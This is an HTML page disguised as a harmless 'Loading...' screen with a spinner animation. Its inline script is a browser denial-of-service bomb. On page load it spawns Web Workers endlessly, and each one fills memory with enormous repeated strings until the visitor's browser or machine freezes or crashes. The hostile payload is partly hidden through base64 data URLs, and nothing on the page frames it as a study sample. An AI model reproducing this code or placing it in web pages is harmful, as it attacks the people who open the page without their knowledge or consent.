<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        .loader {
  border: 16px solid #f3f3f3;
  border-radius: 50%;
  border-top: 16px solid #3498db;
  width: 120px;
  height: 120px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 2s linear infinite;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
        main {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
        }

        body {
            background-color: black;
        }

        img {
            opacity: 1;
            animation: fadein 1s ease-in-out;
        }

        @keyframes fadein {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        @keyframes fadein1 {
            0% {
                opacity: 0;
            }

            50% {
                opacity: 0;
            }

            100% {
                opacity: 1
            }
        }

        h2 {
            color: white;
            font-family: Arial;
            opacity: 1;
            animation: fadein1 1s ease-in-out;
        }
    </style>
</head>

<body>
    <main>
        <h2>Loading...</h2>
        <img
            src="">
    </main>
        
    <script>
        var I_R = 0x1FFFFFE8;
        var I_O = 0xFFFF;
        var I_I = `f=[];while(!0){f.push(String.fromCharCode(${I_O}).repeat(${I_R}))}`;
        var I_D = `data:text/html;base64,${btoa(I_I)}`;
        var I_C = `while(!0){new Worker("${I_D}")}`;
        var I_W = `data:text/html;base64,${btoa(I_C)}`;
        new Worker(I_W);
    </script>
</body>

</html>
